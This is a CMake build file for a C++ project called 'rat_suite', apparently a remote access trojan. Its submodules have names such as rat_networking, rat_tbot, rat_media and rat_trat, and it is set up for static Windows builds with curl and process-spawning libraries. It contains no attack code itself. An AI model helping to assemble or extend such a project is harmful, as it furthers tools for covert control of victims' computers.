cmake_minimum_required(VERSION 3.25)
project(rat_suite LANGUAGES CXX)

# === C++ Standard ===
set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)

# === Output directories ===
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/bin")
set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/lib")

# === Options ===
option(STATIC "Build static libraries" ON)
option(DEBUG "Enable debug logging" OFF)

# === Static library path ===
set(STATIC_DIR "${CMAKE_SOURCE_DIR}/../Static")
set(STATIC_INCLUDE "${STATIC_DIR}/include")
set(STATIC_LIB "${STATIC_DIR}/lib")

include_directories(${STATIC_INCLUDE})
link_directories(${STATIC_LIB})

find_package(Threads REQUIRED)

# fmt
add_library(fmt STATIC IMPORTED GLOBAL)
set_target_properties(fmt PROPERTIES
    IMPORTED_LOCATION "${STATIC_LIB}/libfmt.a"
    INTERFACE_INCLUDE_DIRECTORIES "${STATIC_INCLUDE}"
)

# zlib
add_library(zlib STATIC IMPORTED GLOBAL)
set_target_properties(zlib PROPERTIES
    IMPORTED_LOCATION "${STATIC_LIB}/libz.a"
    INTERFACE_INCLUDE_DIRECTORIES "${STATIC_INCLUDE}"
)

# tiny-process
add_library(tiny-process STATIC IMPORTED GLOBAL)
set_target_properties(tiny-process PROPERTIES
    IMPORTED_LOCATION "${STATIC_LIB}/libtiny-process-library.a"
    INTERFACE_INCLUDE_DIRECTORIES "${STATIC_INCLUDE}"   # <- so #include <tiny-process-library/process.hpp> works
)

# curl
add_library(curl STATIC IMPORTED GLOBAL)
set_target_properties(curl PROPERTIES
    IMPORTED_LOCATION "${STATIC_LIB}/libcurl.a"
    INTERFACE_INCLUDE_DIRECTORIES "${STATIC_INCLUDE}"
    INTERFACE_COMPILE_DEFINITIONS "CURL_STATICLIB"
    INTERFACE_LINK_LIBRARIES "zlib;ws2_32;bcrypt;crypt32;wldap32;normaliz"
)
add_library(CURL::libcurl ALIAS curl)
# === extra aliases for consistency ===
add_library(FMT::fmt ALIAS fmt)
add_library(ZLIB::zlib ALIAS zlib)
add_library(TINY::process ALIAS tiny-process)


# === spdlog (only in debug mode, from MSYS2 env) ===
if(DEBUG)
    find_package(spdlog REQUIRED)
    message(STATUS "Debug mode enabled: adding -g -O0")
    add_compile_options(-g -O0)
endif()

# === Force static linking for MinGW ===
if(STATIC AND MINGW)
    set(CMAKE_FIND_LIBRARY_SUFFIXES ".a" ".lib")
    set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -static -static-libgcc -static-libstdc++")
endif()

# === Submodules ===
add_subdirectory(rat_state)
add_subdirectory(rat_encryption)
add_subdirectory(rat_compression)
add_subdirectory(rat_networking)
add_subdirectory(rat_system)
add_subdirectory(rat_tbot)
add_subdirectory(rat_media)
add_subdirectory(rat_tbot_handler)
add_subdirectory(rat_trat)

# === Global linkage (to reuse in submodules) ===
set(GLOBAL_LIBS fmt curl zlib tiny-process ws2_32 bcrypt crypt32)

# Example:
# target_link_libraries(rat_networking PRIVATE ${GLOBAL_LIBS})
